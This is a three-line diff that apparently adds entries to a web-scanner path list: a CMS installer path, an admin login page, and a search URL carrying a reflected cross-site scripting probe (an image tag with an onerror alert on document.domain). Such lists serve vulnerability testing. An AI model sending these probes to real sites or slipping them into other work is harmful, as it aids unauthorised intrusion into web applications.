@@ -1,0 +1,3 @@
+/application/install/index.php
+/admin/index/login.html
+/index.php?m=search&c=index&a=initxqb4n<img%20src%3da%20onerror%3dalert(document.domain)>cu9rs&modelid=1&q=tes
